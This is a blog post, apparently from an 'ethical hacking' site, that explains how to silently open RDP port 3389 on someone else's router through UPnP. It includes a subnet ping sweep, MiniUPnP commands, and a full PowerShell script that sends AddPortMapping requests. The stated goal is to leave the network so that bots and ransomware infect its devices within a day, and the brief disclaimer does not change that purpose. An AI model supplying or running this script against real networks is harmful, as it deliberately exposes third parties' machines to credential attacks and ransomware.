@@ -1,0 +1,323 @@
+---
+layout: post
+title: destroy all devices connected to a network with RDP Port Forwards via UPnP
+date: 2025-06-24 19:17:16.000000000 +02:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Ethical Hacking
+- WiFi Attacks
+tags: []
+meta:
+  _edit_last: '1'
+  _aioseo_title: ''
+  _aioseo_description: ''
+  _aioseo_keywords: ''
+  _aioseo_og_title: ''
+  _aioseo_og_description: ''
+  _aioseo_og_article_section: ''
+  _aioseo_og_article_tags: ''
+  _aioseo_twitter_title: ''
+  _aioseo_twitter_description: ''
+  _wp_page_template: default
+author:
+  login: GeoTheo
+  email: theodorgeor@gmail.com
+  display_name: GeoTheo
+  first_name: ''
+  last_name: ''
+permalink: "/ethical-hacking/destroy-a-network-with-port-forwarding/"
+---
+<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"><br />
+<!-- wp:paragraph --><html><body></p>
+<p><strong>IMPORTANT: This post and any other post I upload is written for informational and educational purposes only! DO NOT try this on any network you do not have permission to ethically test.</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>In this tutorial I will cover how to port forward vulnerable ports for a network you have access. You need is a connection to the network and the target to have Remote Desktop enabled. If you don't have a connection, you can achieve it with a network adapter and the methods we discussed in previous posts. Before we begin here's some explanation of the "hack":</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:list --></p>
+<ul class="wp-block-list">
+<!-- wp:list-item --></p>
+<li>
+<strong>How Port Forwarding Works:</strong><br>Instead of changing Windows Firewall on the host, you configure your <strong>router</strong> to map an external port (e.g. 3389) to an internal IP and port. Once that mapping is in place, any connection to your router's public IP on that port is forwarded to the chosen machine.</li>
+<p><!-- /wp:list-item -->
+</ul>
+<p><!-- /wp:list --></p>
+<p><!-- wp:list --></p>
+<ul class="wp-block-list">
+<!-- wp:list-item --></p>
+<li>Most consumer routers like ziggo support and have enabled by default "<strong>UPnP</strong>" (Universal Plug-and-Play), which lets any LAN host request a port forward without logging into the router's UI.</li>
+<p><!-- /wp:list-item -->
+</ul>
+<p><!-- /wp:list --></p>
+<p><!-- wp:list --></p>
+<ul class="wp-block-list">
+<!-- wp:list-item --></p>
+<li>Automated scanners and malware bots sweep the Internet continuously looking for these vulnerable ports</li>
+<p><!-- /wp:list-item -->
+</ul>
+<p><!-- /wp:list --></p>
+<p><!-- wp:list --></p>
+<ul class="wp-block-list">
+<!-- wp:list-item --></p>
+<li>after forwarding the vulnerable port traffic from the router to the machine automated scripts will eventually hit it and the following will happen:<br><strong>&lt; 5 minutes: </strong><br>Your host shows up in passive "honeypots" (Spoki, etc.)<br><strong>5 minutes - 1 hour: </strong><br>ZMap‐class scanners probe and index your IP:3389<br><strong>1 - 4 hours: </strong><br>Credential‐guessing bots flood RDP login attempts<br><strong>4 - 24 hours:</strong><br>malware (ransomware, cryptominers) arrive. Most sophisticated ransomware will try to send a copy of themselves on other devices on the network too.</li>
+<p><!-- /wp:list-item -->
+</ul>
+<p><!-- /wp:list --></p>
+<p><!-- wp:list --></p>
+<ul class="wp-block-list">
+<!-- wp:list-item --></p>
+<li>To comprehend how vulnerable some ports are, here are some unencrypted authentication services (they literally send the credentials in plain text):<br><strong>FTP (21)</strong><br>File Transfer Protocol.<br><strong>POP3 (110)</strong> and <strong>IMAP (port 143)</strong><br>Mail retrieval protocols.<br><strong>HTTP (80)</strong><br>Any websites or APIs not using HTTPS.<br><strong>VNC (5900)</strong><br>Virtual Network Computing.</li>
+<p><!-- /wp:list-item -->
+</ul>
+<p><!-- /wp:list --></p>
+<p><!-- wp:list --></p>
+<ul class="wp-block-list">
+<!-- wp:list-item --></p>
+<li>The vulnerable port we are going to use is <strong>RDP (3389)</strong> Windows Remote Desktop.</li>
+<p><!-- /wp:list-item -->
+</ul>
+<p><!-- /wp:list --></p>
+<p><!-- wp:heading {"level":3} --></p>
+<h3 class="wp-block-heading">STEP 1. Discover the Target Machine's LAN IP:</h3>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Find your subnet with ipconfig. Mine is 192.168.178.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>ping every address in the subnet:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>for /L %i in (1,1,254) do @ping -n 1 -w 50 192.168.178.%i &gt;nul &amp;&amp; echo Live: 192.168.178.%i</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Identify the IP of the device you want to expose.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Now to open the port on that device you have to either use a UPnP client like MiniUPnP (https://miniupnp.tuxfamily.org/files/) or you can create your own script.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading {"level":3} --></p>
+<h3 class="wp-block-heading">method 1: MiniUPnP client</h3>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>create the mapping:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Add a mapping 3389 -&gt; int 192.168.178.38:3389 with the command:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><br>upnpc.exe -e "RDP" -a 192.168.178.38 3389 3389 TCP</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>verify it worked:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>upnpc.exe -l</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Disconnect your machine from the network and leave. In less than a day the network will have been infected with ransomware (at least)</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>in case you want to remove the mapping:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>upnpc.exe -d 3389 TCP</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading {"level":3} --></p>
+<h3 class="wp-block-heading">method 2. Custom Script</h3>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>run this script in elevated powershell session and pass the target IP as a parameter:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>param(
+  [Parameter(Mandatory)][string]$InternalClient,      # e.g. 192.168.178.38
+  [int]$InternalPort   = 3389,
+  [int]$ExternalPort   = 3389,
+  [ValidateSet('TCP','UDP')][string]$Protocol = 'TCP',
+  [string]$Description = 'RDP-via-UPnP'
+)
+
+function Find-IGDLocation {
+  $mreq = @"
+M-SEARCH * HTTP/1.1
+HOST:239.255.255.250:1900
+MAN:""ssdp:discover""
+MX:2
+ST:urn:schemas-upnp-org:device:InternetGatewayDevice:1
+
+"@
+  $udp = New-Object Net.Sockets.UdpClient
+  $udp.Client.SendTimeout    = 2000
+  $udp.Client.ReceiveTimeout = 2000
+  $udp.Send([Text.Encoding]::ASCII.GetBytes($mreq), $mreq.Length, '239.255.255.250', 1900) &gt; $null
+  try {
+    $resp = [Text.Encoding]::ASCII.GetString($udp.Receive([ref]([Net.IPEndPoint]::new([Net.IPAddress]::Any,0))))
+  } finally { $udp.Close() }
+  if ($resp -notmatch 'LOCATION:\s*(\S+)') { throw 'No UPnP gateway found.' }
+  return $Matches[1]
+}
+
+function Get-WANService {
+  param($DescUrl)
+  $xml = Invoke-WebRequest -UseBasicParsing -Uri $DescUrl
+  $doc = [xml]$xml.Content
+  $svc = $doc.root.device.deviceList.device |
+         ForEach-Object { $_.deviceList.device.serviceList.service } |
+         Where-Object { $_.serviceType -match 'WANIPConnection|WANPPPConnection' } |
+         Select-Object -First 1
+  if (-not $svc) { throw 'No WANIPConnection service in description.' }
+  $base = [uri]$DescUrl
+  return [pscustomobject]@{
+    ControlURL  = ([uri]::new($base, $svc.controlURL)).AbsoluteUri
+    ServiceType = $svc.serviceType
+  }
+}
+
+# Discover
+$loc   = Find-IGDLocation
+$wan   = Get-WANService -DescUrl $loc
+
+# Build &amp; send SOAP AddPortMapping
+$soap = @"
+&lt;?xml version=""1.0""?&gt;
+&lt;s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/"" 
+            s:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""&gt;
+  &lt;s:Body&gt;
+    &lt;u:AddPortMapping xmlns:u=""$($wan.ServiceType)""&gt;
+      &lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;
+      &lt;NewExternalPort&gt;$ExternalPort&lt;/NewExternalPort&gt;
+      &lt;NewProtocol&gt;$Protocol&lt;/NewProtocol&gt;
+      &lt;NewInternalPort&gt;$InternalPort&lt;/NewInternalPort&gt;
+      &lt;NewInternalClient&gt;$InternalClient&lt;/NewInternalClient&gt;
+      &lt;NewEnabled&gt;1&lt;/NewEnabled&gt;
+      &lt;NewPortMappingDescription&gt;$Description&lt;/NewPortMappingDescription&gt;
+      &lt;NewLeaseDuration&gt;0&lt;/NewLeaseDuration&gt;
+    &lt;/u:AddPortMapping&gt;
+  &lt;/s:Body&gt;
+&lt;/s:Envelope&gt;
+"@
+
+$req = [Net.WebRequest]::Create($wan.ControlURL)
+$req.Method      = 'POST'
+$req.ContentType = 'text/xml; charset=utf-8'
+$req.Headers.Add('SOAPACTION', '"' + $wan.ServiceType + '#AddPortMapping"')
+$bytes = [Text.Encoding]::UTF8.GetBytes($soap)
+$req.ContentLength = $bytes.Length
+$stream = $req.GetRequestStream(); $stream.Write($bytes,0,$bytes.Length); $stream.Close()
+
+try {
+  $res = $req.GetResponse(); $res.Close()
+  Write‐Host "Forwarding added: $ExternalPort → $InternalClient`: $InternalPort ($Protocol)" -ForegroundColor Green
+} catch [Net.WebException] {
+  $e = $_.Exception.Response.GetResponseStream() |
+       ForEach-Object {[IO.StreamReader]::new($_).ReadToEnd()}
+  throw "Router error:`n$e"
+}</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>verify it worked:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>Test-NetConnection (Invoke-RestMethod http://ifconfig.me/ip) -Port 3389</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Disconnect your machine from the network and leave. In less than a day the network will have been infected with ransomware (at least)</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>to remove the mapping, run this script with the parameters of the port you opened and the protocol used (3389 and TCP)</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>scriptparam(
+  [int]$ExternalPort = 3389,
+  [ValidateSet('TCP','UDP')][string]$Protocol = 'TCP'
+)
+
+function Find-IGDLocation {
+  $mreq = @"
+M-SEARCH * HTTP/1.1
+HOST:239.255.255.250:1900
+MAN:""ssdp:discover""
+MX:2
+ST:urn:schemas-upnp-org:device:InternetGatewayDevice:1
+
+"@
+  $udp = New-Object Net.Sockets.UdpClient
+  $udp.Client.SendTimeout    = 2000
+  $udp.Client.ReceiveTimeout = 2000
+  $udp.Send([Text.Encoding]::ASCII.GetBytes($mreq), $mreq.Length, '239.255.255.250', 1900) | Out-Null
+  try {
+    $resp = [Text.Encoding]::ASCII.GetString(
+      $udp.Receive([ref]([Net.IPEndPoint]::new([Net.IPAddress]::Any,0)))
+    )
+  } finally { $udp.Close() }
+  if ($resp -notmatch 'LOCATION:\s*(\S+)') {
+    throw 'No UPnP gateway found via SSDP.'
+  }
+  return $Matches[1]
+}
+
+function Get-WANService {
+  param($DescUrl)
+  $xml = Invoke-WebRequest -UseBasicParsing -Uri $DescUrl
+  $doc = [xml]$xml.Content
+
+  $svc = $doc.root.device.deviceList.device |
+         ForEach-Object { $_.deviceList.device.serviceList.service } |
+         Where-Object { $_.serviceType -match 'WANIPConnection|WANPPPConnection' } |
+         Select-Object -First 1
+
+  if (-not $svc) {
+    throw 'No WANIPConnection service found in description.'
+  }
+  $base = [uri]$DescUrl
+  return [pscustomobject]@{
+    ControlURL  = ([uri]::new($base, $svc.controlURL)).AbsoluteUri
+    ServiceType = $svc.serviceType
+  }
+}
+
+# Discover the router’s UPnP IGD endpoint
+$location = Find-IGDLocation
+$wan      = Get-WANService -DescUrl $location
+
+# Build the DeletePortMapping SOAP envelope
+$soap = @"
+&lt;?xml version="1.0"?&gt;
+&lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
+            s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
+  &lt;s:Body&gt;
+    &lt;u:DeletePortMapping xmlns:u="$($wan.ServiceType)"&gt;
+      &lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;
+      &lt;NewExternalPort&gt;$ExternalPort&lt;/NewExternalPort&gt;
+      &lt;NewProtocol&gt;$Protocol&lt;/NewProtocol&gt;
+    &lt;/u:DeletePortMapping&gt;
+  &lt;/s:Body&gt;
+&lt;/s:Envelope&gt;
+"@
+
+# Send the SOAP action
+$req = [Net.WebRequest]::Create($wan.ControlURL)
+$req.Method      = 'POST'
+$req.ContentType = 'text/xml; charset=utf-8'
+$req.Headers.Add('SOAPACTION', '"' + $wan.ServiceType + '#DeletePortMapping"')
+$bytes = [Text.Encoding]::UTF8.GetBytes($soap)
+$req.ContentLength = $bytes.Length
+$stream = $req.GetRequestStream(); $stream.Write($bytes,0,$bytes.Length); $stream.Close()
+
+try {
+  $res = $req.GetResponse()
+  $res.Close()
+  Write-Host "Removed UPnP mapping for port $ExternalPort/$Protocol" -ForegroundColor Green
+} catch [Net.WebException] {
+  $err = $_.Exception.Response.GetResponseStream() |
+         ForEach-Object { (New-Object IO.StreamReader($_)).ReadToEnd() }
+  throw "Router returned an error while removing mapping:`n$err"
+}</code></pre>
+<p><!-- /wp:code --><br />
+</body></html></p>
